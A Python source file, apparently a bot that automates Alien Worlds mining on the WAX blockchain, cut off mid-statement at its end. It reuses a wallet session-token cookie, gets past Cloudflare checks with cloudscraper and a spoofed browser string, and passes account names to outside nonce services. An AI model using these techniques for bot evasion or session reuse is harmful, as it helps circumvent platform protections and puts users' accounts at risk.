import os
import re
import sys
import glob
import time
import json
import base64
import random
import logging
import _thread
import datetime
import requests
#   https://pypi.org/project/cloudscraper/
import cloudscraper
import pytz
from flask import Flask, json, jsonify, request, redirect, send_from_directory, Response, make_response, render_template

timedate = datetime.datetime
timezone = pytz.timezone

#   os.environ['VERCEL_URL'] VERCEL_URL and NEXT_PUBLIC_VERCEL_URL 

class style():
    BLACK       = '\033[30m'
    RED         = '\033[31m'
    ORANGE      = '\033[91m'
    GREEN       = '\033[32m'
    YELLOW      = '\033[33m'
    BLUE        = '\033[34m'
    MAGENTA     = '\033[35m'
    CYAN        = '\033[36m'
    WHITE       = '\033[37m'
    UNDERLINE   = '\033[4m'
    RESET       = '\033[0m'
class WAXAPI():
    addrlists = [
        'https://waxapi.ledgerwise.io', 
        'https://api.wax.alohaeos.com', 
        'https://wax.greymass.com', 
        #   , 'https://wax.dapplica.io', 
        'https://wax.dapplica.io', 
        'https://wax.eoseoul.io', 
        'https://wax.blacklusion.io', 
        'https://wax.blokcrafters.io'
        #   , 'https://wax-worker.alienworlds.tools'
        #   , 'http://waxswedenex56rp5.onion'
    ]
    lastminer = [
        'https://wax.pink.gg', 
        'https://wax.eosn.io'
    ]
    histories = [
        'https://wax.hkeos.com', 
        #   'https://wax.eosphere.io', 
        #   'https://waxapi.ledgerwise.io', 
        'https://api.waxsweden.org', 
        'https://wax.cryptolions.io', 
        'https://wax.blokcrafters.io'
    ]
    claimsigh = [
        'https:/chain.wax.io', 
        'https:/wax.dapplica.io'
    ]
    getserver = '/v1/chain/get_info'
    hostminer = [{
        'address' : 'https://awfreemine.cf/?waxaccount=', 
        'methods' : 'GET', 
        'payload' : '', 
        'headers' : {
            "accept"                        : "application/json, text/plain, */*", 
            "accept-language"               : "en-US,en;q=0.9", 
            "access-control-allow-origin"   : "*", 
            "cache-control"                 : "no-cache", 
            "content-type"                  : "application/json", 
            "pragma"                        : "no-cache", 
            "sec-fetch-dest"                : "empty", 
            "sec-fetch-mode"                : "cors", 
            "sec-fetch-site"                : "cross-site", 
            "sec-gpc"                       : "1"
        }
    }, {
        'address' : 'https://awmine-express.vercel.app/mine?waxaccount=', 
        'methods' : 'GET', 
        'payload' : '', 
        'headers' : {
            "accept"                        : "application/json, text/plain, */*",
            "accept-language"               : "en-US,en;q=0.9",
            "access-control-allow-origin"   : "*",
            "cache-control"                 : "no-cache",
            "content-type"                  : "application/json",
            "pragma"                        : "no-cache",
            "sec-fetch-dest"                : "empty",
            "sec-fetch-mode"                : "cors",
            "sec-fetch-site"                : "cross-site",
            "sec-gpc"                       : "1"
        }
    }, {
        'address' : 'https://awmine-express-00001.vercel.app/mine?waxaccount=', 
        'methods' : 'GET', 
        'payload' : '', 
        'headers' : {
            "accept"                        : "application/json, text/plain, */*",
            "accept-language"               : "en-US,en;q=0.9",
            "access-control-allow-origin"   : "*",
            "cache-control"                 : "no-cache",
            "content-type"                  : "application/json",
            "pragma"                        : "no-cache",
            "sec-fetch-dest"                : "empty",
            "sec-fetch-mode"                : "cors",
            "sec-fetch-site"                : "cross-site",
            "sec-gpc"                       : "1"
        }
    }, {
        'address' : 'https://awmine-express-00002.vercel.app/mine?waxaccount=', 
        'methods' : 'GET', 
        'payload' : '', 
        'headers' : {
            "accept"                        : "application/json, text/plain, */*",
            "accept-language"               : "en-US,en;q=0.9",
            "access-control-allow-origin"   : "*",
            "cache-control"                 : "no-cache",
            "content-type"                  : "application/json",
            "pragma"                        : "no-cache",
            "sec-fetch-dest"                : "empty",
            "sec-fetch-mode"                : "cors",
            "sec-fetch-site"                : "cross-site",
            "sec-gpc"                       : "1"
        }
    }]
    #   def __init__(
    #       self
    #   ):
    #       global DATABASE
    #       DATABASE = 'YYYYY'

DATABASE = {}
THREADER = {}

class AWMINE():
    def __init__(
        self, 
        waxid, 
        token
    ):
        
        global DATABASE
        global THREADER
        
        DATABASE.update({
            waxid : {
                'cpu'           : {
                    'per'               : 0, 
                    'max'               : 0, 
                    'available'         : 0, 
                    'last_cpu_usage'    : 0, 
                    'stake'             : 0
                }, 
                'balance'       : {
                    'TLM'               : 0, 
                    'WAX'               : 0
                }, 
                'cooldown'      : 0, 
                'waxapi'        : '', 
                'land'          : 0, 
                'difficulty'    : 0, 
                'last_mine'     : {
                    'time'              : '', 
                    'mine'              : 0
                }, 
                'stat' : None, 
                'text' : {
                    'step'  : '00', 
                    '00'    : '<pre>0/0 UPDATE DATABASE -----</pre>', 
                    '01'    : '<pre>0/0 LOGIN SESSIONS -------</pre>', 
                    '02'    : '<pre>1/4 WAITING -------------------</pre>', 
                    '03'    : '<pre>2/4 GET BAGS INFO ---------</pre>', 
                    '04'    : '<pre>3/4 GET LAND -----------------</pre>', 
                    '05'    : '<pre>4/4 READY TO MINE ---------</pre>', 
                    '06'    : '<pre>0/0 GET ACCOUNT INFO ---</pre>', 
                    '07'    : '<pre>0/0 CALCU DIFFICULTY -----</pre>', 
                    '08'    : '<pre>0/0 CHECK LAST TX ----------</pre>', 
                    '09'    : '<pre>2/9 CLAIM GET nonce ------</pre>', 
                    '10'    : '<pre>3/9 GET { NONCE }</pre>', 
                    '11'    : '<pre>4/9 CLAIM PACKED TRX -------</pre>', 
                    '12'    : '<pre>5/9 CLAIM REQ KEYS ---------</pre>', 
                    '13'    : '<pre>6/9 CLAIM SIGN -------------</pre>', 
                    '14'    : '<pre>7/9 CLAIM PUSH -------------</pre>', 
                    '15'    : '<pre>8/9 CHECK HISTORY ---------</pre>', 
                    '16'    : '<pre>9/9 CLAIM DONE -------------</pre>', 
                    '17'    : '<pre>9/9 CLAIM NONE -------------</pre>', 
                    '18'    : '<pre>0/0 RENEW ENDPOINT ------</pre>', 
                    '19'    : '<pre>0/0 CHECK COOLDOWN -------</pre>', 
                    '20'    : '<pre>0/0 CALCU CPU ------------</pre>', 
                    '21'    : '<pre>1/9 CLAIM START ----------</pre>'
                }
            }
        })
        
        try:
            self.DATA   = {
                'waxid'             : waxid, 
                'token'             : token, 
                'login'             : None, 
                'account'           : None, 
                'block'             : {
                    'chain_id'          : 0,
                    'head_block_num'    : 0,
                    'ref_block_prefix'  : 0
                }, 
                'packedtrx'         : {}, 
                'balance'           : 0.0000, 
                'last_mine'         : {}, 
                'last_time'         : '', 
                'avatar'            : {}, 
                'bags'              : {}, 
                'land'              : {
                    'difficulty'    : 0, 
                    'commission'    : 0.0
                }, 
                'difficulty'        : 0, 
                'cooldown'          : 0, 
                'cpu'               : {}, 
                'nonce'             : None, 
                'transaction'       : {
                    'raw' : '', 
                    'res' : None
                }, 
                'waxserver'         : random.choice(WAXAPI.addrlists), 
                'getserver'         : WAXAPI.getserver, 
                'PROCESS'           : {
                    'get_login'             : None, 
                    'get_account'           : None, 
                    'get_info_balance'      : None, 
                    'get_info_last_mine'    : None, 
                    'get_info_avatar'       : None, 
                    'get_bags'              : None, 
                    'get_land'              : None, 
                    'set_difficulty'        : None, 
                    'set_cooldown'          : None, 
                    'chk_cpu'               : None, 
                    'get_nonce'             : None, 
                    'get_info_block'        : None, 
                    'set_packedtrx'         : None, 
                    'claim_sign'            : None, 
                    'get_transaction'       : {
                        'request' : None, 
                        'content' : None
                    }
                }, 'log'            : {
                    'last_tlm_mined'        : 0.0000, 
                    'last_cpu_usage'        : 0
                }
            }
        except Exception as e:
            print( f'__init__ ERROR 218 : {e}' )
            if THREADER.get(self.DATA['waxid']):
                THREADER.pop(self.DATA['waxid'])
            if DATABASE.get(self.DATA['waxid']):
                DATABASE.pop(self.DATA['waxid'])
            return False
            
        try:
            self.get_login()
        except NameError as e:
            print( f'__init__ ERROR 227 : {e}' )
            if THREADER.get(self.DATA['waxid']):
                THREADER.pop(self.DATA['waxid'])
            if DATABASE.get(self.DATA['waxid']):
                DATABASE.pop(self.DATA['waxid'])
            raise NameError(e)
        except Exception as e:
            print( f'__init__ ERROR 227 : {e}' )
            if THREADER.get(self.DATA['waxid']):
                THREADER.pop(self.DATA['waxid'])
            if DATABASE.get(self.DATA['waxid']):
                DATABASE.pop(self.DATA['waxid'])
                
            return False
            
        THREADER.update({
            self.DATA['waxid'] : {
                'status'        : None, 
                'data'          : self.DATA, 
                'get_account'   : None, 
                'logs'          : None, 
                'operate'       : None
            }
        })
        
        #   print( self.DATA )
        #   self.operate()
        
    def logs(
        self
    ):
        
        global DATABASE
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                try         : DATABASE[ self.DATA['waxid'] ]['cpu']['per']                  = int(self.DATA['cpu']['allow'])
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['cpu']['max']                  = int(self.DATA['cpu']['max'])
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['cpu']['available']            = int(self.DATA['cpu']['available'])
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['cpu']['last_cpu_usage']       = int(self.DATA['log']['last_cpu_usage'])
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['balance']['TLM']              = self.DATA['balance'].split(' ')[0]
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['balance']['WAX']              = self.DATA['account']['core_liquid_balance'].split(' ')[0]
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['cooldown']                    = (
                    timedate.strptime(
                        #   str(timedate.now(tz = pytz.utc).astimezone(timezone('US/Pacific'))).split('.')[0], 
                        str(timedate.now()).split('.')[0], 
                        "%Y-%m-%d %H:%M:%S"
                    ) - timedate.strptime(
                        self.DATA['last_time'].split('.')[0], 
                        "%Y-%m-%dT%H:%M:%S"
                    )
                ).seconds
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['waxapi']                      = self.DATA['waxserver']
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['cpu']['stake']                = float(self.DATA['account']['total_resources']['cpu_weight'].split(' ')[0]) - 1.0
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['land']                        = self.DATA["last_mine"]["current_land"]
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['difficulty']                  = self.DATA["difficulty"]
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['last_mine']['time']           = self.DATA['last_time'].split('.')[0]
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['last_mine']['mine']           = self.DATA['log']['last_tlm_mined']
                except      : pass
                
            except Exception as e:
                print( f'echo ERROR 244 : {e}' )
            finally:
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '00' if random.randrange(100) >= 80 and DATABASE[ self.DATA['waxid'] ]['text']['step'] == '02' else DATABASE[ self.DATA['waxid'] ]['text']['step']
                except      : pass
                time.sleep(1)
            continue
    def hook(
        self
    ):
        
        global DATABASE
        global THREADER
        
        return self.DATA
    def thread(
        self
    ):
    
        global DATABASE
        global THREADER
        
        THREADER[ self.DATA['waxid'] ]['status']        = True
        THREADER[ self.DATA['waxid'] ]['get_account']   = _thread.start_new_thread(self.get_account, (), {
            'loop' : True
        })
        THREADER[ self.DATA['waxid'] ]['logs']          = _thread.start_new_thread(self.logs, ())
        THREADER[ self.DATA['waxid'] ]['operate']       = _thread.start_new_thread(self.operate, ())
        THREADER[ self.DATA['waxid'] ]['data']          = self.DATA
        return THREADER[ self.DATA['waxid'] ]['status']
    def operate(
        self
    ):
        
        global DATABASE
        global THREADER
        
        while True:

            try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '02'
            except      : pass
        
            if DATABASE[ self.DATA['waxid'] ]['stat'] == None:
                try:
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '06'
                    except      : pass
                    self.get_account(loop = False)
                except Exception as e:
                    print( f'__init__ ERROR 361 : {e}' )
                    return
                try:
                    self.get_info_balance()
                except Exception as e:
                    print( f'__init__ ERROR 169 : {e}' )
                    return
                try:
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '08'
                    except      : pass
                    self.get_info_last_mine()
                except Exception as e:
                    print( f'__init__ ERROR 174 : {e}' )
                    return
                try:
                    self.get_info_avatar()
                except Exception as e:
                    print( f'__init__ ERROR 179 : {e}' )
                    return
                try:
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '03'
                    except      : pass
                    self.get_bags()
                except Exception as e:
                    print( f'__init__ ERROR 184 : {e}' )
                    return
                try:
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '04'
                    except      : pass
                    self.get_land()
                except Exception as e:
                    print( f'__init__ ERROR 189 : {e}' )
                    return
                try:
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '07'
                    except      : pass
                    self.set_difficulty()
                except Exception as e:
                    print( f'__init__ ERROR 194 : {e}' )
                    return
                try:
                    self.set_cooldown()
                except Exception as e:
                    print( f'__init__ ERROR 199 : {e}' )
                    return
                try:
                    self.chk_cpu()
                except Exception as e:
                    print( f'__init__ ERROR 204 : {e}' )
                    return
                try:
                    self.get_transaction()
                except Exception as e:
                    print( f'__init__ ERROR 209 : {e}' )
                    return
                    
                DATABASE[ self.DATA['waxid'] ]['stat'] = True
            try:
                if (
                    timedate.strptime(
                        #   str(timedate.now(tz = pytz.utc).astimezone(timezone('US/Pacific'))).split('.')[0], 
                        str(timedate.now()).split('.')[0], 
                        "%Y-%m-%d %H:%M:%S"
                    ) - timedate.strptime(
                        self.DATA['last_time'].split('.')[0], 
                        "%Y-%m-%dT%H:%M:%S"
                    )
                ).seconds >= self.DATA['cooldown'] and (
                    self.chk_cpu() >= 5 or (
                        (int(
                            self.DATA['cpu']['available']
                        ) * 1.15) >= int(
                            self.DATA['log']['last_cpu_usage']
                        )
                    ) or random.randrange(999) >= 989
                ) and THREADER[ self.DATA['waxid'] ]['status'] == True:
                
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '05'
                    except      : pass
                    
                    self.get_serialized()
                    
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '21'
                    except      : pass
                    
                    self.claim_sign() # --> True or False
                    
                    try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '18'
                    except      : pass
                    
                    #   self.DATA.update({
                    #       'waxserver' : random.choice(WAXAPI.addrlists)
                    #   })
                    self.DATA['waxserver'] = random.choice(WAXAPI.addrlists)
                elif (
                    self.DATA['nonce'] == '' or self.DATA['nonce'] == None
                ) and (
                    timedate.strptime(
                        #   str(timedate.now(tz = pytz.utc).astimezone(timezone('US/Pacific'))).split('.')[0], 
                        str(timedate.now()).split('.')[0], 
                        "%Y-%m-%d %H:%M:%S"
                    ) - timedate.strptime(
                        self.DATA['last_time'].split('.')[0], 
                        "%Y-%m-%dT%H:%M:%S"
                    )
                ).seconds >= (self.DATA['cooldown'] * 0.75):
                    self.get_nonce()
                elif (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
                else:
                    if (
                        timedate.strptime(
                            #   str(timedate.now(tz = pytz.utc).astimezone(timezone('US/Pacific'))).split('.')[0], 
                            str(timedate.now()).split('.')[0], 
                            "%Y-%m-%d %H:%M:%S"
                        ) - timedate.strptime(
                            self.DATA['last_time'].split('.')[0], 
                            "%Y-%m-%dT%H:%M:%S"
                        )
                    ).seconds >= self.DATA['cooldown']:
                        try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '05'
                        except      : pass
                        
                    #   print(
                    #       '[{NOW}-{STA}]-[__{WAX}]-[CDs {CDs:04d}]-[CPU {CPU:03d}.{CPu:02d}% {CPA:06d}/{CPM:06d}:{LPU}]-[MINED {TLM:04d}.{TLm:04d}:{BAL:04d}.{BAl:04d} TOTAL]'.format(
                    #           #   NOW = str(timedate.now(tz = pytz.utc))[2:].split('.')[0], 
                    #           NOW = str(timedate.now())[2:].split('.')[0], 
                    #           STA = DATABASE[ self.DATA['waxid'] ]['stat'], 
                    #           WAX = self.DATA['waxid'][3:], 
                    #           CDs = (
                    #               timedate.strptime(
                    #                   #   str(timedate.now(tz = pytz.utc).astimezone(timezone('US/Pacific'))).split('.')[0], 
                    #                   str(timedate.now()).split('.')[0], 
                    #                   "%Y-%m-%d %H:%M:%S"
                    #               ) - timedate.strptime(
                    #                   self.DATA['last_time'].split('.')[0], 
                    #                   "%Y-%m-%dT%H:%M:%S"
                    #               )
                    #           ).seconds, 
                    #           CPU = int(str(self.chk_cpu()).split('.')[0]), 
                    #           CPu = int(str(self.chk_cpu()).split('.')[1]), 
                    #           CPA = int(self.DATA['cpu']['available']), 
                    #           CPM = int(self.DATA['cpu']['max']), 
                    #           LPU = int(self.DATA['log']['last_cpu_usage']), 
                    #           TLM = int(str(self.DATA['log']['last_tlm_mined']).split('.')[0]), 
                    #           TLm = int(str(self.DATA['log']['last_tlm_mined']).split('.')[1]), 
                    #           BAL = int(str(self.DATA['balance'].split(' ')[0]).split('.')[0]), 
                    #           BAl = int(str(self.DATA['balance'].split(' ')[0]).split('.')[1])
                    #       )
                    #   )
                    
                    if (
                        timedate.strptime(
                            #   str(timedate.now(tz = pytz.utc).astimezone(timezone('US/Pacific'))).split('.')[0], 
                            str(timedate.now()).split('.')[0], 
                            "%Y-%m-%d %H:%M:%S"
                        ) - timedate.strptime(
                            self.DATA['last_time'].split('.')[0], 
                            "%Y-%m-%dT%H:%M:%S"
                        )
                    ).seconds <= (self.DATA['cooldown'] * 0.75) and random.randrange(100) >= 78 and DATABASE[ self.DATA['waxid'] ]['text']['step'] == '02':
                        DATABASE[ self.DATA['waxid'] ]['stat'] = None
            except Exception as e:
                print( f'__init__ ERROR 512 : {e}' )
            finally:
                time.sleep(3)
            continue
        THREADER.pop( self.DATA['waxid'] )
        DATABASE.pop( self.DATA['waxid'] )
        print('SOME THING WRONG OR THREAD TURN OFF')
    def get_serialized(
        self
    ):
        
        global DATABASE
        
        try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '09'
        except      : pass
        
        if self.DATA['nonce'] == '' or self.DATA['nonce'] == None:
            self.get_nonce()
        self.set_info_block()
        
        try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '11'
        except      : pass
        
        self.set_packedtrx()
    def get_login(
        self
    ):
        
        global DATABASE
        
        self.DATA['PROCESS']['get_login'] = None
        
        while True:
            try:
                self.DATA['PROCESS']['get_login']       = cloudscraper.CloudScraper(
                    browser = {
                        'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                    }, 
                    #*   debug       = True, 
                    delay       = 10
                ).get(
                    'http://api-idm.wax.io/v1/accounts/auto-accept/login',
                    cookies = {
                        'session_token' : f'{ self.DATA["token"] }'
                    },
                    headers = {
                        'authority'     : 'api-idm.wax.io',
                        'origin'        : 'https://wallet.wax.io',
                        'referer'       : 'https://wallet.wax.io/',
                        'cookie'        : f'session_token={ self.DATA["token"] }',
                    }, 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                
                if json.loads(self.DATA['PROCESS']['get_login'].content) and json.loads(self.DATA['PROCESS']['get_login'].content).get('errors'):
                    raise NameError('Unauthorized')
                
                self.DATA.update({
                    'login'         : json.loads(self.DATA['PROCESS']['get_login'].content)
                })
        
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '01'
                except      : pass
                
            except NameError as e:
                print( f'ERROR get_login() : {e}' )
                raise NameError(e)
                break
            except Exception as e:
                print( f'ERROR get_login() : {e}' )
                time.sleep(6)
                continue
            break
    def get_account(
        self, 
        loop = False
    ):
        
        global DATABASE
        
        self.DATA['PROCESS']['get_account'] = None

        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_account']         = cloudscraper.create_scraper().post(
                    f'http://{ self.DATA["waxserver"].split("//")[-1] }/v1/chain/get_account',
                    data    = f'{{\"account_name\":\"{ self.DATA["login"]["userAccount"] }\"}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '06' if random.randrange(100) >= 80 and DATABASE[ self.DATA['waxid'] ]['text']['step'] == '02' else DATABASE[ self.DATA['waxid'] ]['text']['step']
                except      : pass
                
                self.DATA.update({
                    'account'       : json.loads(self.DATA['PROCESS']['get_account'].content)
                })
            except Exception as e:
                print( f'ERROR get_account() 240 : {e}' )
                time.sleep(5)
                continue
            if loop == False:
                break
            else:
                if random.randrange(100) >= 40 and DATABASE[ self.DATA['waxid'] ]['text']['step'] == '02': self.get_info_balance()
                if random.randrange(100) >= 40 and DATABASE[ self.DATA['waxid'] ]['text']['step'] == '02':
                    self.get_bags()
                    self.get_land()
                    self.set_difficulty()
                time.sleep(10); continue
    def get_info_balance(
        self
    ):
        self.DATA['PROCESS']['get_info_balance'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_info_balance']    = cloudscraper.create_scraper().post(
                    f'http://{ self.DATA["waxserver"].split("//")[-1] }/v1/chain/get_table_rows', 
                    data    = f'{{\"json\":true,\"code\":\"alien.worlds\",\"scope\":\"{ self.DATA["login"]["userAccount"] }\",\"table\":"accounts\",\"table_key\":\"\",\"lower_bound\":\"\",\"upper_bound\":\"\",\"index_position\":1,\"key_type\":\"\",\"limit\":1,\"reverse\":false,\"show_payer\":false}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA.update({
                    'balance'       : json.loads(self.DATA['PROCESS']['get_info_balance'].content)['rows'][0]['balance']
                })
            except Exception as e:
                print( f'ERROR get_info_balance() 271 : {e}' )
                self.DATA['waxserver'] = random.choice(WAXAPI.addrlists)
                time.sleep(5)
                continue
            break
    def get_info_last_mine(
        self
    ):
        
        self.DATA['PROCESS']['get_info_last_mine'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_info_last_mine']  = cloudscraper.create_scraper().post(
                    f'http://{ random.choice( WAXAPI.lastminer ).split("//")[-1] }/v1/chain/get_table_rows',
                    data    = f'{{\"json\":true,\"code\":\"m.federation\",\"scope\":\"m.federation\",\"table\":\"miners\",\"table_key\":\"\",\"lower_bound\":\"{ self.DATA["login"]["userAccount"] }\",\"upper_bound\":\"{ self.DATA["login"]["userAccount"] }\",\"index_position\":1,\"key_type\":\"\",\"limit\":10,\"reverse\":false,\"show_payer\":false}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                #   self.DATA.update({
                #       'last_mine'     : json.loads(self.DATA['PROCESS']['get_info_last_mine'].content)['rows'][0]
                #   })
                self.DATA['last_mine'] = json.loads(self.DATA['PROCESS']['get_info_last_mine'].content)['rows'][0]
            except Exception as e:
                print( f'ERROR get_info_last_mine() 732 : {e}' )
                self.DATA['waxserver'] = random.choice(WAXAPI.addrlists)
                time.sleep(5)
                continue
            break
    def get_info_avatar(
        self
    ):
        
        self.DATA['PROCESS']['get_info_avatar'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_info_avatar']     = cloudscraper.create_scraper().post(
                    f'http://{ self.DATA["waxserver"].split("//")[-1] }/v1/chain/get_table_rows',
                    data    = f'{{\"json\":true,\"code\":\"alien.worlds\",\"scope\":\"{ self.DATA["login"]["userAccount"] }\",\"table\":\"accounts\",\"table_key\":\"\",\"lower_bound\":\"\",\"upper_bound\":\"\",\"index_position\":1,\"key_type\":\"\",\"limit\":1,\"reverse\":false,\"show_payer\":false}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA.update({
                    'avatar'    : json.loads(self.DATA['PROCESS']['get_info_avatar'].content)['rows'][0]
                })
            except Exception as e:
                print( f'ERROR get_info_avatar() 271 : {e}' )
                time.sleep(5)
                continue
            break
    def get_bags(
        self
    ):
        
        self.DATA['PROCESS']['get_bags'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_bags']            = cloudscraper.create_scraper().post(
                    f'http://{ self.DATA["waxserver"].split("//")[-1] }/v1/chain/get_table_rows',
                    data    = f'{{\"json\":true,\"code\":\"m.federation\",\"scope\":\"m.federation\",\"table\":\"bags\",\"table_key\":\"\",\"lower_bound\":\"{ self.DATA["login"]["userAccount"] }\",\"upper_bound\":\"{ self.DATA["login"]["userAccount"] }\",\"index_position\":1,\"key_type\":\"\",\"limit\":10,\"reverse\":false,\"show_payer\":false}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                for b in json.loads(self.DATA['PROCESS']['get_bags'].content)['rows'][0]['items']:
                    self.DATA['bags'].update({
                        b : {
                            'difficulty'    : 0, 
                            'delay'         : 0, 
                            'info'          : None
                        }
                    })
            except Exception as e:
                print( f'ERROR get_bags() 271 : {e}' )
                self.DATA['waxserver'] = random.choice(WAXAPI.addrlists)
                time.sleep(5)
                continue
            break
        #   https://api.alienworlds.io/v1/alienworlds/asset?id=1099542806152,1099529459927,1099522662202
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_bags']            = cloudscraper.create_scraper().get(
                    f'https://api.alienworlds.io/v1/alienworlds/asset?id={ ",".join(self.DATA["bags"]) }'
                )
                {
                    self.DATA['bags'].update({
                    str( x['asset_id'] ) : {
                        'difficulty'    : x["data"]["difficulty"], 
                        'delay'         : x["data"]["delay"], 
                        'info'          : x
                    }}) for x in json.loads(self.DATA['PROCESS']['get_bags'].content)['results'] 
                }
            except Exception as e:
                print( f'ERROR get_bags() 779 : {e}' )
                time.sleep(5)
                continue
            break
    def get_land(
        self
    ):
        
        self.DATA['PROCESS']['get_land'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_land']            = cloudscraper.create_scraper().get(
                    f'http://wax.api.atomicassets.io/atomicassets/v1/assets/{ self.DATA["last_mine"]["current_land"] }'
                )
                self.DATA.update({
                    'land'          : {
                        'difficulty'    : json.loads(self.DATA['PROCESS']['get_land'].content)['data']['data']['difficulty'], 
                        'commission'    : float(
                            '{0}.{1}'.format(
                                str(json.loads(self.DATA["PROCESS"]["get_land"].content)["data"]["data"]["commission"])[0], 
                                str(json.loads(self.DATA["PROCESS"]["get_land"].content)["data"]["data"]["commission"])[-2:]
                            )
                        ) if json.loads(self.DATA["PROCESS"]["get_land"].content)["data"]["data"]["commission"] >= 1 else 0.00, 
                        'delay'         : float(
                            '{0}.{1}'.format(
                                str(json.loads(self.DATA["PROCESS"]["get_land"].content)["data"]["data"]["delay"])[0], 
                                str(json.loads(self.DATA["PROCESS"]["get_land"].content)["data"]["data"]["delay"])[-1:]
                            )
                        ) if json.loads(self.DATA["PROCESS"]["get_land"].content)["data"]["data"]["delay"] >= 1 else 1.0
                    }
                })
            except Exception as e:
                print( f'ERROR get_land() 271 : {e}' )
                time.sleep(5)
                continue
            break
    def set_difficulty(
        self
    ):
        self.DATA.update({
            'difficulty' : self.DATA['land']['difficulty']
        })
        {
            self.DATA.update({
                'difficulty' : self.DATA['difficulty'] + self.DATA['bags'][t]['difficulty']
            }) for t in list(self.DATA['bags']) if self.DATA['bags'][t]['difficulty'] >= 1
        }
    def set_cooldown(
        self
    ):
        self.DATA.update({
            'cooldown' : 0
        })
        {
            self.DATA.update({
                'cooldown' : self.DATA['cooldown'] + self.DATA['bags'][t]['delay']
            }) for t in list(self.DATA['bags']) if self.DATA['bags'][t]['delay'] >= 1
        }
        self.DATA.update({
